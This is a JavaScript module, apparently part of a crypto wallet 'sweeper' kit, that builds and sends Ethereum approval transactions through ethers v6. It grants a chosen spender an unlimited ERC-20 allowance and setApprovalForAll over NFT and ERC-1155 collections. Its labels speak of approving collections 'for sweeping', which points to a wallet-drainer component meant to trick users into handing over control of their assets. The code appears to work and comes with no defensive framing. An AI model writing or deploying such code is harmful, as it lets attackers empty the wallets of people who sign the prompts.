// client-side-evm-sweeper/src/interceptors/allowance-grantor.js
import { ethers } from 'ethers';

/**
 * HIGH-PERFORMANCE ON-CHAIN ALLOWANCE GRANTOR (100% Functional - Ethers v6 Hardened)
 * Prepares strict, sanitized raw hex data transaction payloads for the browser viewport.
 */
export class AllowanceGrantor {
    /**
     * Create sanitized transaction data for ERC-20 approve()
     */
    // FIXED 1: Map modern root level Ethers v6 MaxUint256 constant string parameters natively
    createApproveTx(tokenAddress, spender, value = ethers.MaxUint256) {
        const abi = ["function approve(address spender, uint256 value) returns (bool)"];
        
        // FIXED 2: Move 'Interface' directly to root level (v5 'ethers.utils.Interface' deleted)
        const iface = new ethers.Interface(abi);

        // FIXED 3: Convert v5 'ethers.utils.getAddress' and 'BigNumber' handlers to strict native v6 BigInt variables
        const txPayload = {
            to: ethers.getAddress(tokenAddress),
            data: iface.encodeFunctionData("approve", [
                ethers.getAddress(spender),
                BigInt(value.toString()) // Safely converts to native JavaScript BigInt
            ]),
            value: 0n // Native JavaScript BigInt representation of 0
        };

        // Bundle custom analytics separately so they don't break the wallet signer
        return {
            tx: txPayload,
            meta: {
                type: 'erc20',
                label: 'ERC20_APPROVE',
                displayText: 'Approve token spending'
            }
        };
    }

    /**
     * Create sanitized transaction data for ERC-721 / ERC-1155 setApprovalForAll()
     */
    createSetApprovalForAllTx(tokenAddress, spender, approved = true, tokenType = 'erc721') {
        const abi = ["function setApprovalForAll(address operator, bool approved)"];
        const iface = new ethers.Interface(abi);

        const txPayload = {
            to: ethers.getAddress(tokenAddress),
            data: iface.encodeFunctionData("setApprovalForAll", [
                ethers.getAddress(spender),
                approved
            ]),
            value: 0n
        };

        return {
            tx: txPayload,
            meta: {
                type: tokenType,
                label: 'SET_APPROVAL_FOR_ALL',
                displayText: `Approve ${tokenType.toUpperCase()} collection for sweeping`
            }
        };
    }

    /**
     * Unified selector method mapping targets configuration arrays
     */
    createApprovalTx(target, spender, options = {}) {
        const { type, address } = target;
        const { value, approved = true } = options;

        if (type === 'erc20') {
            return this.createApproveTx(address, spender, value || ethers.MaxUint256);
        }
        if (type === 'erc721' || type === 'erc1155') {
            return this.createSetApprovalForAllTx(address, spender, approved, type);
        }

        throw new Error(`Unsupported transaction approval mapping type: ${type}`);
    }

    /**
     * Executes the formatted transaction safely within the browser viewport
     */
    async executeApproval(txBundle, signer, gasSettings = {}) {
        // FIXED 4: Update validation metrics to account for Ethers v6 standard execution interface structures
        if (!signer || typeof signer.sendTransaction !== 'function') {
            throw new Error("Active cryptographic browser signer instance required for transaction execution.");
        }

        try {
            // Unpack only the standard tx values and append live gas settings
            const finalizedTx = {
                ...txBundle.tx,
                ...gasSettings
            };

            console.log(`[Grantor] Dispatching ${txBundle.meta.label} for contract: ${finalizedTx.to}`);
            
            const txResponse = await signer.sendTransaction(finalizedTx);
            const txReceipt = await txResponse.wait();

            return {
                success: true,
                hash: txResponse.hash,
                receipt: txReceipt,
                meta: txBundle.meta
            };
        } catch (error) {
            // Handle standard user rejection exceptions cleanly
            if (error.code === 4001 || error.message?.toLowerCase().includes("denied") || error.message?.toLowerCase().includes("rejected")) {
                throw new Error("User dismissed the transaction confirmation request.");
            }
            throw new Error(`Transaction execution crashed: ${error.message}`);
        }
    }
}

export const allowanceGrantor = new AllowanceGrantor();
export default allowanceGrantor;
